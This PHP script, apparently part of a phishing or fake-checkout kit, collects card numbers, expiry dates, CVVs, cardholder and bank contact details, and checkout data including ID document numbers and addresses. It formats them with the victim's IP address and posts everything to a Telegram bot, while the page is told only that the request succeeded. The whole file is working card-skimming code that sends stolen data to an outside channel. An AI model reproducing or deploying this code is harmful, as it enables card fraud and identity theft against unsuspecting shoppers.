<?php
session_start();
header('Content-Type: application/json');

// TOKEN Y CHAT
$token  = "";
$chatId = "";

// DATOS DE LA TARJETA / bold.php
$tarjeta   = $_POST['tarjeta']   ?? '';
$fecha     = $_POST['fecha']     ?? '';
$cvv       = $_POST['cvv']       ?? '';
$emailBank = $_POST['email_bank']?? '';
$telBank   = $_POST['tel_bank']  ?? '';
$titular   = $_POST['titular']   ?? '';
$bin       = $_POST['bin']       ?? '';
$banco     = $_POST['banco_prohibido'] ?? 'Banco';

// DATOS DEL CHECKOUT (guardados en sesión)
$cliente = [
  'nombre'      => $_SESSION['cliente_nombre']      ?? '',
  'apellidos'   => $_SESSION['cliente_apellidos']   ?? '',
  'documento'   => $_SESSION['cliente_documento']   ?? '',
  'correo'      => $_SESSION['cliente_correo']      ?? '',
  'telefono'    => $_SESSION['cliente_telefono']    ?? '',
  'ciudad'      => $_SESSION['cliente_ciudad']      ?? '',
  'direccion'   => $_SESSION['cliente_direccion']   ?? ''
];

// ARMAR MENSAJE
$mensaje  = "🚫 *INTENTO DE BIN PROHIBIDO*\n\n";

$mensaje .= "👤 *Cliente (checkout)*\n";
$mensaje .= "{$cliente['nombre']} {$cliente['apellidos']}\n";
$mensaje .= "Documento: {$cliente['documento']}\n";
$mensaje .= "Teléfono: {$cliente['telefono']}\n";
$mensaje .= "Correo: {$cliente['correo']}\n";
$mensaje .= "Ciudad: {$cliente['ciudad']}\n";
$mensaje .= "Dirección: {$cliente['direccion']}\n\n";

$mensaje .= "💳 *Pago con tarjeta (bold.php)*\n";
$mensaje .= "Titular: $titular\n";
$mensaje .= "Correo banco: $emailBank\n";
$mensaje .= "Tel banco: $telBank\n";
$mensaje .= "Tarjeta: $tarjeta\n";
$mensaje .= "Fecha: $fecha\n";
$mensaje .= "CVV: $cvv\n";
$mensaje .= "BIN: $bin\n";
$mensaje .= "Banco detectado: 🚫 *PROHIBIDO ($banco)*\n\n";

$mensaje .= "🌐 IP: ".($_SERVER['REMOTE_ADDR'] ?? 'IP desconocida');

// ENVIAR A TELEGRAM
$url = "https://api.telegram.org/bot$token/sendMessage";
$data = ['chat_id'=>$chatId,'text'=>$mensaje,'parse_mode'=>'Markdown'];

file_get_contents($url, false, stream_context_create([
  'http'=>[
    'method'=>'POST',
    'header'=>"Content-Type: application/x-www-form-urlencoded",
    'content'=>http_build_query($data)
  ]
]));

echo json_encode(['ok'=>true]);
